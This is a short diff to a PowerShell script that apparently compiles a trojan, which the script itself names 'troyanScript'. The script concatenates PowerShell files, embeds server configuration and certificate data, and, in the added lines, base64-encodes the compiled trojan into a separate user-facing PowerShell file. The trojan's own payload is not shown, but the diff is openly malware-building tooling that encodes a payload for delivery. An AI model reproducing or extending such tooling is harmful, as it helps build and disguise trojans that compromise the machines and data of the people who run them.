@@ -64,7 +64,7 @@ function Format-ArrayToString {
 
 #certs
 $template = @"
-`$xserver = '_SERVER'
+`$server = '_SERVER' | ConvertFrom-Json
 `$xdata = @{
     _CERT
 }
@@ -117,5 +117,21 @@ foreach ($file in $ps1Files) {
     $joinedContent += $fileContent + [System.Environment]::NewLine
 }
 $joinedContent | Set-Content -Path $server.troyanScript -Encoding UTF8
+
+
+function Encode-FileToBase64 {
+    param (
+        [string]$inFile
+    )
+    if (-Not (Test-Path -Path $inFile)) {
+        return "File $inFile not found."
+    }
+    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
+    $encodedContent = [Convert]::ToBase64String($fileContent)
+    return $encodedContent
+}
+
+$encoded = Encode-FileToBase64 -inFile $server.troyanScript
+$encoded | Set-Content -Path $server.userPowershellFile -Encoding UTF8
 
 Write-Host "Troyan Compile complete"
